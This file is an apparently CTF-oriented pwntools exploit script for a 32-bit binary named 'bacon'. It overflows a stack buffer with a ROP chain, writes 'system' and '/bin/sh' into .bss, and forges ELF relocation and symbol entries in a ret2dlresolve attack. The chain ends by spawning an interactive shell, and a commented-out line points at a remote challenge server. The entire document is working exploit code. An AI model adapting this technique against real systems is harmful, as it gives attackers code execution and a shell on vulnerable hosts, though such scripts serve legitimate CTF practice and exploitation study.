from pwn import *

context.clear(arch="i386")
context.log_level = "DEBUG"

e = ELF("./bacon")
rop = ROP(e)

VULN = 0x804925d

BSS = e.get_section_by_name(".bss")["sh_addr"]
PLT = e.get_section_by_name(".plt")["sh_addr"]

SYSTEM_STR_ADDR = BSS
BINSH_STR_ADDR = BSS + 0x20

FAKE_SYM_ADDR = BSS + 0x100
FAKE_REL_ADDR = BSS + 0x200

STRTAB, SYMTAB, JMPREL, VERSYM = (e.dynamic_value_by_tag(t) for t in ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL", "DT_VERSYM"])

assert (FAKE_SYM_ADDR - SYMTAB) % 16 == 0 # Alignment sanity check

def write_what_where(stream, what, where):
    rop = ROP(e)
    rop.read(0, where, len(what))
    rop.raw(VULN)

    payload = (b"A" * 1036 + rop.chain()).ljust(0x42c, b"X")

    assert len(payload) == 0x42c

    stream.send(payload)
    stream.send(what)


def build_elf32_sym():
    fake_sym = b""
    fake_sym += p32(SYSTEM_STR_ADDR - STRTAB) # st_name, points to "system"
    fake_sym += p32(0xAAAAAAAA) # st_value (unused)
    fake_sym += p32(0xBBBBBBBB) # st_size (unused)
    fake_sym += p32(0) # st_other; st_other & 3 must equal 0
    return fake_sym

def build_elf32_rel():
    fake_rel = b""
    fake_rel += p32(FAKE_REL_ADDR + 0x100) # r_offset; Arbitraty writeable address
    r_info = (FAKE_SYM_ADDR - SYMTAB) // 16
    r_info = (r_info << 8) | 7
    fake_rel += p32(r_info) # r_info; offset of fake sym struct, 7=R_386_JMP_SLOT
    return fake_rel


# nc jh2i.com 50032
#p = remote("jh2i.com", 50032)
p = process("./bacon")

#gdb.attach(p)

write_what_where(p, b"system", SYSTEM_STR_ADDR)
write_what_where(p, b"/bin/sh", BINSH_STR_ADDR)

write_what_where(p, build_elf32_sym(), FAKE_SYM_ADDR)
write_what_where(p, build_elf32_rel(), FAKE_REL_ADDR)

final_payload = b""
final_payload += p32(PLT)
final_payload += p32(FAKE_REL_ADDR - JMPREL) # reloc_offset
final_payload += p32(0xCCCCCCCC) # return after system()
final_payload += p32(BINSH_STR_ADDR)

payload = (b"A" * 1036 + final_payload).ljust(0x42c, b"X")
p.send(payload)

p.interactive()
